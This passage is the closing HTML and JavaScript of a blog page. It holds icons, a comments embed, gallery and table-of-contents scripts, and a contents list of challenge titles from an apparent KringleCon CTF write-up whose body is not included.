<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
    <h1 class="related__title">
      <hr class="hr-dots"/>
      <div>
        See Also
      </div>
      <hr class="hr-dots"/>
    </h1>
    <ul class="related-ul">
        
        <li>
          <a href="/posts/kringlecon3/" class="related__link">KringleCon 3: Three French Hens</a>
        </li>
        
    </ul>
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://noobintheshell.com/posts/mcafee_ctf_2021/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">MacAfee ATR CTF 2021</div>      
      </a>
    
    <div class="grow"></div>
    
  
</nav>
    
  
    <div id="disqus_thread"></div>
<script>
  let disqus_config = function () {
    
    
    
  };
  (function () {
    if (["127.0.0.1"].indexOf(window.location.hostname) != -1) {
      document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
      return;
    }
    var d = document, s = d.createElement('script'); s.async = true;
    s.src = 'https://' + 'noobintheshell' + '.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
  }) ();
</script>
  

    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      
    </div>
  </div>
</main>


<aside class="single__side main-side">
  


<section class="sidebar hide">
  <script>document.querySelector('.sidebar').classList.remove('hide')</script>
  <div class="toc__flexbox" data-position="fixed">
    <h6 class="toc__title" data-ani="true">What&#39;s on this Page</h6>
    
  </div>
  <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#objectives">Objectives</a>
      <ul>
        <li><a href="#1---kringlecon-orientation">1 - KringleCon Orientation</a></li>
        <li><a href="#2---where-in-the-world-is-caramel-santaigo">2 - Where in the World is Caramel Santaigo</a></li>
        <li><a href="#3---thaw-frost-towers-entrance">3 - Thaw Frost Tower&rsquo;s Entrance</a></li>
        <li><a href="#4---slot-machine-investigation">4 - Slot Machine Investigation</a></li>
        <li><a href="#5---strange-usb-device">5 - Strange USB Device</a></li>
        <li><a href="#6---shellcode-primer">6 - Shellcode Primer</a></li>
        <li><a href="#7---printer-exploitation">7 - Printer Exploitation</a></li>
        <li><a href="#8---kerberoasting-on-an-open-fire">8 - Kerberoasting on an Open Fire</a></li>
        <li><a href="#9---splunk">9 - Splunk!</a></li>
        <li><a href="#10---now-hiring">10 - Now Hiring!</a></li>
        <li><a href="#11---customer-complaint-analysis">11 - Customer Complaint Analysis</a></li>
        <li><a href="#12---frost-tower-website-checkup">12 - Frost Tower Website Checkup</a></li>
        <li><a href="#13---fpga-programming">13 - FPGA Programming</a></li>
      </ul>
    </li>
    <li><a href="#terminals">Terminals</a>
      <ul>
        <li><a href="#1---exif-metadata">1 - Exif Metadata</a></li>
        <li><a href="#2---grepping-for-gold">2 - Grepping for Gold</a></li>
        <li><a href="#3---logic-munchers">3 - Logic Munchers</a></li>
        <li><a href="#4---ipv6-sandbox">4 - IPv6 Sandbox</a></li>
        <li><a href="#5---santas-holiday-hero">5 - Santa&rsquo;s Holiday Hero</a></li>
        <li><a href="#6---hoho--no">6 - HoHo &hellip; No</a></li>
        <li><a href="#7---yara-analysis">7 - Yara Analysis</a></li>
        <li><a href="#8---imds-exploration">8 - IMDS Exploration</a></li>
        <li><a href="#9---strace-ltrace-retrace">9 - Strace Ltrace Retrace</a></li>
        <li><a href="#10---the-elf-c0de---python-edition">10 - The Elf C0de - Python Edition!</a></li>
        <li><a href="#11---frostavator">11 - Frostavator</a></li>
        <li><a href="#12a---bonus-blue-log4jack">12a - Bonus! Blue Log4Jack</a></li>
        <li><a href="#12b---bonus-red-log4jack">12b - Bonus! Red Log4Jack</a></li>
      </ul>
    </li>
    <li><a href="#the-narrative">The Narrative</a></li>
    <li><a href="#christmas-eggs">Christmas Eggs</a></li>
    <li><a href="#ressources-and-hints">Ressources and hints</a>
      <ul>
        <li>
          <ul>
            <li></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</section>



</aside>

<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"inner\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>





<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script defer src="/js/helper/throttle.min.js"></script>



















































<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    



    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("true");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      tableOfContentsElem.onmouseenter = function() {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      tableOfContentsElem.onmouseleave = function() {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.add('scrolling');
        }
      }

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');

              if (!navbar.classList.contains('scrolling')) {
                navbar.classList.remove('navbar--show');
                navbar.classList.remove('navbar--hide');
                navbar.classList.add('navbar--hide');
              }
              
              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    
    
    
    
    
    var topOffset = 120;
    var botOffset = 70;
    var handleWindowResize = function () {
      if (tocElem) {
        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
      }
    }
    var throttledWindowResize = throttle(handleWindowResize, 300);
    throttledWindowResize()

    
    window.addEventListener('resize', throttledWindowResize);
    



    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var size = parseInt(elem.tagName.substr(1), 10) * 2;
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.left = '0.75rem';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerHTML = `
<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    // =================================================================



    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;
